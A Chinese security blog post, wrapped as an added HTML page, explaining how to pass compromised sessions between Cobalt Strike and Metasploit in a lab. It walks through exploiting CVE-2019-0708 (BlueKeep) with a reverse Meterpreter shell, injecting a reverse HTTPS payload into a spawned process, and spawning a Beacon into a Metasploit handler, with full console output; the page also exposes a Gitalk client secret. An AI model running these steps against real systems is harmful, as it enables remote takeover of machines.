@@ -1,0 +1,1238 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="【经验总结】CS与MSF之间的会话传递, Teams Six">
+    <meta name="description" content="">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-150271429-1"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() {
+        dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+    gtag('config', 'UA-150271429-1');
+</script>
+
+
+    <title>【经验总结】CS与MSF之间的会话传递 | Teams Six</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+    <script data-ad-client="ca-pub-7704006270618117" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Teams Six" type="application/atom+xml">
+</head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Teams Six</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Teams Six</div>
+        <div class="logo-desc">
+            
+            I can do all this through him who gives me strength. (Philippians 4:13 NIV)
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_19-11-30.png')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">【经验总结】CS与MSF之间的会话传递</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        height: calc(100vh - 250px);
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #567ddf;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #567ddf;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/Cobalt-Strike/">
+                                <span class="chip bg-color">Cobalt Strike</span>
+                            </a>
+                        
+                            <a href="/tags/MSF/">
+                                <span class="chip bg-color">MSF</span>
+                            </a>
+                        
+                            <a href="/tags/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/">
+                                <span class="chip bg-color">经验总结</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/" class="post-category">
+                                经验总结
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2021-01-29
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2021-08-04
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    1.5k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    7 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>众所周知，Cobalt Strike 的前身是 Armitage，而 Armitage 又可以理解为 Metasploit  Framework 的图形界面版，因此 Cobalt Strike 与 Metasploit  Framework 在很多地方都是兼容的，所以我们便可以将 Metasploit  Framework 攻击产生的会话传递到 Cobalt Strike 上，同样的 Cobalt Strike 的会话也能够传递到 Metasploit  Framework</p>
+<p><strong>Metasploit  Framework 会话传递到 Cobalt Strike 上整体过程如下：</strong></p>
+<p>1、Metasploit Framework 调用攻击载荷，这里调用的是喜闻乐见的 CVE-2019-0708</p>
+<p>2、Metasploit Framework 发起攻击，获取会话</p>
+<p>3、Cobalt Strike 新建一个 Beacon，这里使用的是 HTTPS Beacon</p>
+<p>4、最后，在 Metasploit Framework 上调用 exploit/windows/local/payload_inject 模块</p>
+<p>5、在该模块上配置与 Cobalt Strike 上为同样类型的 payload，即 HTTPS Payload，设置 Cobalt Strike 服务器的 IP 和 端口后运行即可</p>
+<p><strong>Cobalt Strike 会话传递到 Metasploit  Framework 上整体过程如下：</strong></p>
+<p>1、首先，Cobalt Strike 需要获得一个会话，这里直接采用 Scripted Web Delivery（S）的方式使靶机上线</p>
+<p>2、接着，Metasploit Framework 调用 exploit/multi/handler 模块</p>
+<p>3、在该模块上配置 HTTP Payload，为该 payload 的 IP 和 端口设置成 Metasploit Framework 所在主机 IP，端口自定义即可</p>
+<p>4、 之后运行该模块</p>
+<p>5、在 Cobalt Strike 上创建一个 Foreign HTTP 的监听，监听 IP 和端口设置成刚才 Metasploit Framework 上所监听的 IP 和端口</p>
+<p>7、接着在 Cobalt Strike 上右击选择要传递的会话，找到 Spawn 选项，选择刚刚创建的监听器即可</p>
+<blockquote>
+<p>环境信息：</p>
+<p>攻击 IP：192.168.175.200 （Cobalt Strike 服务端、Metasploit Framework 所在主机）</p>
+<p>靶机 IP：192.168.175.177 （一台有 CVE-2019-0708 漏洞的 Win7 SP1 64 位靶机）</p>
+</blockquote>
+<h1 id="0x01-Metasploit-Framework-会话传递到-Cobalt-Strike"><a href="#0x01-Metasploit-Framework-会话传递到-Cobalt-Strike" class="headerlink" title="0x01 Metasploit Framework 会话传递到 Cobalt Strike"></a>0x01 Metasploit Framework 会话传递到 Cobalt Strike</h1><h2 id="1、Cobalt-Strike-上的操作"><a href="#1、Cobalt-Strike-上的操作" class="headerlink" title="1、Cobalt Strike 上的操作"></a>1、Cobalt Strike 上的操作</h2><p>首先来到 Cobalt Strike 目录下，启动 Cobalt Strike 服务端</p>
+<pre><code>./teamserver yourip yourpassword</code></pre>
+<p>之后打开 Cobalt Strike 客户端进行连接</p>
+<pre><code>./start.sh</code></pre>
+<p>输入服务端密码连接上之后，点击 Cobalt Strike –&gt; Listeners 打开 Listeners 界面，点击下方的 Add 按钮，输入 Beacon 名称，这里选择的是 HTTPS Beacon，添加上主机 IP，点击保存，即可创建一个 HTTPS Beacon</p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-24_20-07-57.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<h2 id="2、Metasploit-Framework-上的操作"><a href="#2、Metasploit-Framework-上的操作" class="headerlink" title="2、Metasploit Framework 上的操作"></a>2、Metasploit Framework 上的操作</h2><p>首先，打开 Metasploit Framework</p>
+<pre><code>msfconsole </code></pre>
+<p>调用 CVE-2019-0708 模块</p>
+<pre><code>use exploit/windows/rdp/cve_2019_0708_bluekeep_rce</code></pre>
+<p>设置靶机 IP</p>
+<pre><code>set rhost 192.168.175.177</code></pre>
+<p>设置 Payload</p>
+<pre><code>set payload windows/x64/meterpreter/reverse_tcp
+set lhost 192.168.175.200</code></pre>
+<p>发起攻击</p>
+<pre><code>exploit</code></pre>
+<p>整体过程如下：</p>
+<pre><code>root@kali:~# msfconsole
+
+msf5 &gt; use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+
+msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; set rhost 192.168.175.177
+rhost =&gt; 192.168.175.177
+
+msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; set payload windows/x64/meterpreter/reverse_tcp
+payload =&gt; windows/x64/meterpreter/reverse_tcp
+
+msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; set lhost 192.168.175.200
+lhost =&gt; 192.168.175.200
+
+msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; exploit
+[*] Started reverse TCP handler on 192.168.175.200:4444 
+[*] 192.168.175.177:3389 - Using auxiliary/scanner/rdp/cve_2019_0708_bluekeep as check
+[+] 192.168.175.177:3389  - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
+[*] 192.168.175.177:3389  - Scanned 1 of 1 hosts (100% complete)
+[*] 192.168.175.177:3389 - Using CHUNK grooming strategy. Size 250MB, target address 0xfffffa8028608000, Channel count 1.
+[!] 192.168.175.177:3389 - &lt;---------------- | Entering Danger Zone | ----------------&gt;
+[*] 192.168.175.177:3389 - Surfing channels ...
+[*] 192.168.175.177:3389 - Lobbing eggs ...
+[*] 192.168.175.177:3389 - Forcing the USE of FREE&#39;d object ...
+[!] 192.168.175.177:3389 - &lt;---------------- | Leaving Danger Zone | ----------------&gt;
+[*] Sending stage (206403 bytes) to 192.168.175.177
+[*] Meterpreter session 4 opened (192.168.175.200:4444 -&gt; 192.168.175.177:49167) at 2020-07-26 05:57:22 -0400
+
+meterpreter &gt; </code></pre>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_17-57-47.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<h2 id="3、开始传递会话"><a href="#3、开始传递会话" class="headerlink" title="3、开始传递会话"></a>3、开始传递会话</h2><p>首先，backgroud 会话</p>
+<pre><code>background</code></pre>
+<p>调用 payload_inject 模块</p>
+<pre><code>use exploit/windows/local/payload_inject</code></pre>
+<p>设置 HTTPS Payload</p>
+<pre><code>set payload windows/meterpreter/reverse_https</code></pre>
+<p>设置 lhost 和 lport 为 Cobalt Strike 的监听 IP 与端口</p>
+<pre><code>set lhost 192.168.175.200
+set lport 443</code></pre>
+<p>设置 DisablePayloadHandler 为 True，此选项会让 Metasploit Framework 避免在其内起一个 handler 来服务你的 payload 连接，也就是告诉 Metasploit Framework 说我们已经建立了监听器，不必再新建监听器了。</p>
+<pre><code>set DisablePayloadHandler True</code></pre>
+<p>（可选）设置 PrependMigrate 为 True，此选项让 Metasploit Framework 前置 shellcode 在另一个进程中运行 payload stager，如果被利用的应用程序崩溃或被用户关闭，这会帮助 Beacon 会话存活。</p>
+<pre><code>set PrependMigrate True</code></pre>
+<p>设置要传递的会话 session，如果不知道自己的 session id，可以通过 sessions -l 查看，我这里待传递的 session id 为 4</p>
+<pre><code> set session 4</code></pre>
+<p>开始会话传递</p>
+<pre><code>run</code></pre>
+<p>整体过程如下：</p>
+<pre><code>msf5 &gt; background 
+[*] Backgrounding session 4...
+
+msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; use exploit/windows/local/payload_inject
+
+msf5 exploit(windows/local/payload_inject) &gt; set payload windows/meterpreter/reverse_https
+payload =&gt; windows/meterpreter/reverse_https
+
+msf5 exploit(windows/local/payload_inject) &gt; set lhost 192.168.175.200
+lhost =&gt; 192.168.175.200
+
+msf5 exploit(windows/local/payload_inject) &gt; set lport 443
+lport =&gt; 443
+
+msf5 exploit(windows/local/payload_inject) &gt; set DisablePayloadHandler True
+DisablePayloadHandler =&gt; true
+
+msf5 exploit(windows/local/payload_inject) &gt; set PrependMigrate True
+PrependMigrate =&gt; True
+
+msf5 exploit(windows/local/payload_inject) &gt;  set session 4
+session =&gt; 4
+
+msf5 exploit(windows/local/payload_inject) &gt; run
+[*] Running module against WIN-T0UES7KBMJ5
+[*] Spawned Notepad process 544
+[*] Injecting payload into 544
+[*] Preparing &#39;windows/meterpreter/reverse_https&#39; for PID 544</code></pre>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_19-11-30.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p>此时，来到 Cobalt Strike 下已经可以看到传递过来的会话了</p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-08-39.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<h1 id="0x02-Cobalt-Strike-会话传递到-Metasploit-Framework"><a href="#0x02-Cobalt-Strike-会话传递到-Metasploit-Framework" class="headerlink" title="0x02 Cobalt Strike 会话传递到 Metasploit Framework"></a>0x02 Cobalt Strike 会话传递到 Metasploit Framework</h1><h2 id="1、Cobalt-Strike-上的操作-1"><a href="#1、Cobalt-Strike-上的操作-1" class="headerlink" title="1、Cobalt Strike 上的操作"></a>1、Cobalt Strike 上的操作</h2><p>与上述 Cobalt Strike 的操作步骤一样，这里先创建一个 HTTPS Beacon，接下来创建一个 Powershell 类型的 Scripted Web Delivery（S）</p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-27-02.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10">为了使 Cobalt Strike 获得一个会话，需要复制创建好的命令，并在靶机上运行，此时靶机便会上线了</p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-30-31.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<h2 id="2、Metasploit-Framework-上的操作-1"><a href="#2、Metasploit-Framework-上的操作-1" class="headerlink" title="2、Metasploit Framework 上的操作"></a>2、Metasploit Framework 上的操作</h2><p>首先，在 Metasploit Framework 上调用 handler 模块</p>
+<pre><code>use exploit/multi/handler</code></pre>
+<p>设置 HTTP Payload</p>
+<pre><code>set payload windows/meterpreter/reverse_http
+set lhost 192.168.175.200
+set lport 4480</code></pre>
+<p>运行该模块</p>
+<pre><code>run</code></pre>
+<p>整体过程如下：</p>
+<pre><code>msf5 &gt; use exploit/multi/handler
+
+msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_http
+payload =&gt; windows/meterpreter/reverse_http
+
+msf5 exploit(multi/handler) &gt; set lhost 192.168.175.200
+lhost =&gt; 192.168.175.200
+
+msf5 exploit(multi/handler) &gt; set lport 4480
+lport =&gt; 4480
+
+msf5 exploit(multi/handler) &gt; run
+[*] Started HTTPS reverse handler on http://192.168.175.200:4480</code></pre>
+<h2 id="3、开始会话传递"><a href="#3、开始会话传递" class="headerlink" title="3、开始会话传递"></a><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-35-45.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10">3、开始会话传递</h2><p>在 Cobalt Strike 上先创建一个  Foreign HTTP 监听，IP 和 端口设置成上面 Metasploit Framework 所设置 handler 模块的端口和 IP</p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-39-58.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p>之后在 Cobalt Strike 上右击待传递的会话选择 Spawn ，选择刚刚创建的 Foreign HTTP 监听</p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-54-23.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<p>来到 Metasploit Framework 便能够看到会话已经传递过来了</p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-57-35.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
+<blockquote>
+<p>更多信息欢迎关注我的微信公众号：TeamsSix</p>
+</blockquote>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>
+
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Teams Six</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://www.teamssix.com/210129-191714.html">https://www.teamssix.com/210129-191714.html</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Teams Six</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/Cobalt-Strike/">
+                                    <span class="chip bg-color">Cobalt Strike</span>
+                                </a>
+                            
+                                <a href="/tags/MSF/">
+                                    <span class="chip bg-color">MSF</span>
+                                </a>
+                            
+                                <a href="/tags/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/">
+                                    <span class="chip bg-color">经验总结</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+        <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
+<link rel="stylesheet" href="/css/my-gitalk.css">
+
+<div class="card gitalk-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="gitalk-container" class="card-content"></div>
+</div>
+
+<script src="/libs/gitalk/gitalk.min.js"></script>
+<script>
+    let gitalk = new Gitalk({
+        clientID: 'c8a95bd73658f8325d81',
+        clientSecret: '6f23956fb6261181412ed54eef0d37255730d3fd',
+        repo: 'Gitalk',
+        owner: 'teamssix',
+        proxy: 'https://shielded-brushlands-08810.herokuapp.com/https://github.com/login/oauth/access_token',
+        admin: "teamssix",
+        id: '2021-01-29T19-17-14',
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    });
+
+    gitalk.render('gitalk-container');
+</script>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/210203-192358.html">
+                    <div class="card-image">
+                        
+                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/域林.png" class="responsive-img" alt="【内网学习笔记】1、内网中常见名词解释">
+                        
+                        <span class="card-title">【内网学习笔记】1、内网中常见名词解释</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            1、工作组工作组 Work Group 是最常见最简单最普通的资源管理模式，就是将不同的电脑按功能分别列入不同的组中，以方便管理。
+比如在一个网络内，可能有成百上千台工作电脑，如果这些电脑不进行分组，都列在“网上邻居”内，可想而知会有多么乱
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-02-03
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-category">
+                                    内网学习笔记
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+                        <span class="chip bg-color">学习笔记</span>
+                    </a>
+                    
+                    <a href="/tags/%E7%BA%A2%E9%98%9F/">
+                        <span class="chip bg-color">红队</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%86%85%E7%BD%91/">
+                        <span class="chip bg-color">内网</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/210107-162325.html">
+                    <div class="card-image">
+                        
+                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/diffxss-9.png" class="responsive-img" alt="【经验总结】记录一次有点儿不一样的XSS">
+                        
